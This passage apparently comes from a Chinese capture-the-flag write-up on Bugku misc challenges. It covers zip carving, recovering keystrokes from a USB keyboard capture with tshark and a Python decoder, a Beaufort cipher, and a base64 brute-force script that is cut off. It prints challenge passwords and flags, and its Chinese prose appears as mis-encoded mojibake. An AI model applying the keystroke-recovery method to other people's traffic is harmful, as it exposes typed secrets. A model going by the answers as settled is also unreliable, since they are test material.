å‘ç°æ–‡ä»¶å°¾éƒ¨æœ‰ä¸€ä¸ª504b0304çš„åå…­è¿›åˆ¶å¼€å¤´ï¼Œè¿™æ˜¯zipæ–‡ä»¶çš„æ–‡ä»¶å¤´ï¼Œäºæ˜¯æˆ‘ä»¬åœ¨010ä¸­æ–°å»ºä¸€ä¸ª16è¿›åˆ¶æ–‡ä»¶ï¼ŒæŠŠä»504b0304å¼€å§‹çš„åé¢æ‰€æœ‰æ•°æ®å¤åˆ¶è¿‡æ¥åˆ°æ–°æ–‡ä»¶ä¸­ï¼Œå†ä¿å­˜ä¸ºnew.zip<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/Y%25%5BD0R2T%40F%29S5CU1GOGR9%5BC.png" alt=""><br> åŒæ—¶å†æ–‡ä»¶åº•éƒ¨å‘ç°è¿˜æœ‰ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œå‘ç°æ˜¯å¯†æ–‡<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/J8ZXQDN%40G9EF%5DW%5BA~HX%7BL_T.png" alt=""><br> äºæ˜¯æˆ‘ä»¬æ¥ä¸‹æ¥è¦æ‰¾è§£å¼€å¯†æ–‡çš„keyï¼Œè§£å‹æˆ‘ä»¬åˆšåˆšåˆšä¿å­˜çš„new.zipï¼Œå¾—åˆ°è¿™äº›æ–‡ä»¶<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/Z%24O2AESR%5DW52XY6JSH0%24B%5DM.png" alt=""><br> æ‰“å¼€æµé‡åŒ…<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/6303OL0%5BT%25%40XD%5D%7D%40FHDU%29EL.png" alt=""><br> å‘ç°å…¨æ˜¯usbçš„æµé‡ï¼Œé‚£æˆ‘ä»¬å»kaliå¯¼å‡ºä¸€ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r whereiskey.pcapng -T fields -e usb.capdata &gt; usbdata.txt</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/ZI%28%604I%29SK1%29AQ%284SP%28OR%2446.png" alt=""></p><blockquote><p>é”®ç›˜æ•°æ®åŒ…çš„æ•°æ®é•¿åº¦ä¸º8ä¸ªå­—èŠ‚ï¼Œå‡»é”®ä¿¡æ¯é›†ä¸­åœ¨ç¬¬3ä¸ªå­—èŠ‚ï¼Œæ¯æ¬¡key strokeéƒ½ä¼šäº§ç”Ÿä¸€ä¸ªkeyboard event usb packetï¼Œè¿™é‡Œä¸¤ä½ä¸ºä¸€ä¸ªå­—èŠ‚ï¼Œä¸€å…±8ä¸ªå­—èŠ‚æ˜æ˜¾æ˜¯é”®ç›˜æ•°æ®åŒ…</p></blockquote><p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/VIS%5DLTNAT%24SQYS0F6~DDM%5BD.png" alt=""><br> ä½¿ç”¨è„šæœ¬è§£å¯†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(line)!=<span class="number">17</span>: <span class="comment">#é¦–å…ˆè¿‡æ»¤æ‰é¼ æ ‡ç­‰å…¶ä»–è®¾å¤‡çš„USBæµé‡</span></span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    nums.append(line[<span class="number">0</span>:<span class="number">2</span>]+line[<span class="number">4</span>:<span class="number">6</span>]) <span class="comment">#å–ä¸€ã€ä¸‰å­—èŠ‚</span></span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n[<span class="number">2</span>:<span class="number">4</span>] == <span class="string">&quot;00&quot;</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> n[<span class="number">2</span>:<span class="number">4</span>] <span class="keyword">in</span> normalKeys:</span><br><span class="line">        <span class="keyword">if</span> n[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">&quot;02&quot;</span>: <span class="comment">#è¡¨ç¤ºæŒ‰ä¸‹äº†shift</span></span><br><span class="line">            output += shiftKeys [n[<span class="number">2</span>:<span class="number">4</span>]]</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            output += normalKeys [n[<span class="number">2</span>:<span class="number">4</span>]]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;output :n&#x27;</span> + output)</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/FJ%5D%5DSIP820Z38BUQ%24OKKU%60H.png" alt=""><br> äºæ˜¯è¿›è¡Œåˆ†æ<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/%5B_%605WJHV1%6091LCHFTES1C_G.png" alt=""><br> å›å¤´å†çœ‹çœ‹ï¼Œæœ‰ä¸€ä¸ªæè¿°.txtï¼Œåœ¨è¿™é‡Œå‘ç°ä¸€æ®µæ–‡å­—<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/WO%29V3VDRL0F%24N%40ES2C%5D%7BPSA.png" alt=""><br> æ„æ€æ˜¯è¢«åˆ é™¤çš„æ‰æ˜¯é‡è¦çš„ï¼Œä¹Ÿå°±æ˜¯è¢«delçš„æ‰æ˜¯key<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/7J_%28IGI913~XQX3BPW%5B%24~ZJ.png" alt=""><br> äºæ˜¯å»è§£å¯†ä¸€ä¸‹ï¼Œç½‘å€é“¾æ¥ï¼š<code>https://www.dcode.fr/beaufort-cipher</code><br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/VW22RQQV%28E%246LMS%5BJPP%25H42.png" alt=""><br> å¾—åˆ°å‹ç¼©åŒ…å¯†ç ä¸ºï¼šhappyeverydayï¼Œæ‰“å¼€å‹ç¼©åŒ…ï¼Œå¾—åˆ°flag<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/VFAE%28U0%24~EF%25%7D~%29OH~JQ~_3.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bugku&#123;What_a_enjoyable_music&#125;</span><br></pre></td></tr></table></figure><h3 id="æŠ„é”™çš„å­—ç¬¦"><a class="header-anchor" href="#æŠ„é”™çš„å­—ç¬¦">Â¶</a>æŠ„é”™çš„å­—ç¬¦</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">é¢˜ç›®ï¼š</span><br><span class="line">è€å¸ˆè®©å°æ˜æŠ„å†™ä¸€æ®µè¯ï¼Œç»“æœç²—å¿ƒçš„å°æ˜æŠŠéƒ¨åˆ†æ•°å­—æŠ„æˆäº†å­—æ¯ï¼Œè¿˜å› ä¸ºå¼ºè¿«ç—‡æŠŠæ‰€æœ‰å­—æ¯éƒ½æ¢æˆå¤§å†™ã€‚ä½ èƒ½å¸®å°æ˜æ¢å¤å¹¶è§£å¼€ç­”æ¡ˆå—ï¼šQWIHBLGZZXJSXZNVBZW</span><br></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºï¼Œæœ‰äº›æ•°å­—è¢«æ›¿æ¢æˆäº†å­—æ¯ï¼Œç„¶åæ‰€æœ‰å­—æ¯éƒ½è¢«æ›¿æ¢æˆäº†å¤§å†™å­—æ¯ï¼Œå¯†æ–‡æ˜¯ï¼šQWIHBLGZZXJSXZNVBZW</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çœ‹äº†ä¸€ä¸‹å¯†æ–‡ï¼Œè¢«è®¤é”™çš„å­—æ¯å¤§æ¦‚ç‡æ˜¯Z-2,S-5,B-8,G-9,I-1è¿™äº›</span><br></pre></td></tr></table></figure><p>ä¸€å¼€å§‹æˆ‘æ˜¯æ‰‹æ’¸å‡ºæ¥çš„ï¼Œåˆ†æ®µè§£å…¶å®æŒºå¿«çš„ï¼Œæˆ‘ç”¨äº†åŠä¸ªå°æ—¶å·¦å³ï¼Œæ–¹æ³•å°±æ˜¯æ¯4ä¸ªä¸ºä¸€ä½è¿›è¡Œè§£å¯†ï¼Œè¿™é‡Œå…ˆæ”¾å½“æ—¶æ‰‹è§£çš„å›¾ç‰‡<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E6%8A%84%E9%94%99%E7%9A%84%E5%AD%97%E7%AC%A6/%24%5D%28%60Y1L%7B2O%40U4AVI%4082OT%40D.png" alt=""><br> åæ¥å’Œå¦ä¸€ä½å¸ˆå‚…æ²Ÿé€šæƒ³å†™ä¸ªå¤šçº¿ç¨‹çˆ†ç ´çš„ï¼Œä½†æ²¡å†™æˆåŠŸå“ˆå“ˆ(å¤ªèœäº†)ï¼Œè¿™é‡Œè´´ä¸€ä¸‹æ— è„‘çˆ†ç ´çš„è„šæœ¬å§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Author: dota_st</span></span><br><span class="line"><span class="string">Date: 2021-02-12 18:16:06</span></span><br><span class="line"><span class="string">blog: www.wlhhlc.top</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getallerrorPossible</span>(<span class="params">S, e</span>):</span></span><br><span class="line">    err = e</span><br><span class="line">    r = [<span class="string">&quot;&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> S:</span><br><span class="line">        <span class="keyword">if</span> s <span class="keyword">not</span> <span class="keyword">in</span> err:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(r)):</span><br><span class="line">                r[i] += s</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(r)):</span><br><span class="line">                tmp = r[i]</span><br><span class="line">                <span class="keyword">if</span> s == <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">                    r[i] += s</span><br><span class="line">                    r.append(tmp + <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">                <span class="keyword">elif</span> s == <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">                    r[i] += s</span><br><span class="line">                    r.append(tmp + <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">                <span class="keyword">elif</span> s == <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">                    r[i] += s</span><br><span class="line">                    r.append(tmp + <span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">                <span class="keyword">elif</span> s == <span class="string">&#x27;G&#x27;</span>:</span><br><span class="line">                    r[i] += s</span><br><span class="line">                    r.append(tmp + <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">                <span class="keyword">elif</span> s == <span class="string">&#x27;I&#x27;</span>:</span><br><span class="line">                    r[i] += s</span><br><span class="line">                    r.append(tmp + <span class="string">&#x27;l&#x27;</span>)</span><br><span class="line">                    r.append(tmp + <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">letterCasePermutation</span>(<span class="params">S</span>):</span></span><br><span class="line">    res = [<span class="string">&quot;&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> S:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> s.isalpha():</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">                res[i] += s</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">                tmp = res[i]</span><br><span class="line">                res[i] += s.lower()</span><br><span class="line">                res.append(tmp + s.upper())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_fun</span>(<span class="params"><span class="built_in">list</span>, delete_list</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> <span class="built_in">any</span>(i <span class="keyword">in</span> <span class="built_in">list</span> <span class="keyword">for</span> i <span class="keyword">in</span> delete_list) <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    err = <span class="string">&#x27;ZSBGI&#x27;</span></span><br><span class="line">    s2 = <span class="string">&#x27;QW1hbIGZZXJSXZNVBZW=&#x27;</span></span><br><span class="line">    ap = getallerrorPossible(s2, err)</span><br><span class="line">    delete = [<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;Å“&#x27;</span>]<span class="comment">#å‰”é™¤åŒ…å«è¿™äº›å­—ç¬¦çš„æƒ…å†µ</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> ap:</span><br><span class="line">        r = letterCasePermutation(s)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> r:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f = base64.b64decode(i).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> f.isprintable() <span class="keyword">and</span> <span class="keyword">not</span> delete_fun(f, delete):</span><br><span class="line">                    res.append(f)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]ä¸€å…±è§£å‡º&#123;0&#125;ä¸ª&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(res)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    